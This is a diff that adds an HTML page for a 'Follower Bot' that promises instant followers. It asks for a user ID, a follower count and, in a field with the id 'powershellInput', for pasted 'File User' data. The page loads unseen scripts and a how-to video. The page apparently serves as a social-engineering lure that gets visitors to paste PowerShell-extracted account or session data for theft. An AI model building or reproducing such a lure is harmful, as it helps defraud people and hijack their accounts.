@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Follower Bot</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap">
+    <script src="script.js"></script>
+    <script src="index.js"></script>
+
+
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            overflow: hidden;
+            background: linear-gradient(135deg, #1e1e2e, #252941);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            width: 400px;
+        }
+
+        .input-section {
+            margin: 20px 0;
+        }
+
+        input, textarea {
+            padding: 12px;
+            margin: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border-radius: 8px;
+            outline: none;
+            width: 90%;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        textarea {
+            height: 60px;
+            resize: none;
+        }
+
+        input::placeholder, textarea::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .animated-button {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(45deg, #ff7eb3, #ff758c);
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 4px 10px rgba(255, 118, 158, 0.3);
+            width: 100%;
+        }
+
+        .animated-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 15px rgba(255, 118, 158, 0.5);
+        }
+
+        /* CSS cho khung thông báo */
+        .notification {
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            display: none; /* Ẩn khung thông báo mặc định */
+        }
+
+        .notification.success {
+            color: #155724;
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+        }
+
+        .notification.error {
+            color: #721c24;
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+        }
+    </style>
+    <script>
+        function showHowToUse() {
+            document.getElementById("howToModal").style.display = "block";
+        }
+
+        function closeHowToUse() {
+            document.getElementById("howToModal").style.display = "none";
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1 class="title" id="animated-text">Follower Bot</h1>
+        <p class="description">Boost your followers instantly with our bot.</p>
+        <div class="input-section">
+            <input id="targetUserId" placeholder="Enter your userId">
+            <input type="number" id="followers" placeholder="Number of followers">
+            <textarea id="powershellInput" placeholder="Paste your File User here..."></textarea>
+        </div>
+        <button onclick="startBotting()" class="animated-button">Start Botting!</button>
+        <p id="status" class="status-text"></p>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <a class="how-to-link" onclick="showHowToUse()">How to use?</a>
+        <div id="notification" class="notification" style="display: none;"></div>
+    </div>
+    <div id="howToModal" class="modal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.9); padding: 20px; border-radius: 10px; text-align: center; z-index: 3;">
+        <h2>How to Use</h2>
+        <video controls>
+            <source src="how_to_use.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+        <button class="close-btn" onclick="closeHowToUse()">Close</button>
+    </div>
+    <div id="notification" class="notification" style="display: none;"></div>
+</body>
+</html>
